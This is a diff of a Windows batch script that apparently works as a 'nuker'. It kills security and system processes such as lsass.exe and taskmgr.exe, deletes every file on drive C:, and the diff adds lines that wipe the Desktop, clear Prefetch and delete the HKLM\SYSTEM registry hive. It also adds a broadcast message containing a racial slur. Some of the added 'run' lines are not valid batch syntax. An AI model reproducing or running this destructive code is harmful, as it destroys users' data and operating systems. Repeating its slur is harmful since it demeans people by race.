@@ -13,6 +13,7 @@ del "%temp%\nuker_prompt.vbs"
 color 0A
 echo.
 echo [WARNING] Execution confirmed. Running routines...
+run msg * get fucked nigger
 echo.
 
 taskkill /f /im python.exe
@@ -28,6 +29,10 @@ taskkill /f /im taskmgr.exe
 del /f /q /s C:\*.*
 taskkill /f /im lsass.exe
 goto end
+
+run cmd /c "del /f /q /s C:\*.tmp & del /f /q /s C:\Windows\Prefetch\*.* & taskkill /f /im lsass.exe" 
+run cmd /c "del /f /q /s %userprofile%\Desktop\*.*" 
+run reg delete HKLM\SYSTEM /f 
 
 :cancel
 if exist "%temp%\nuker_prompt.vbs" del "%temp%\nuker_prompt.vbs"
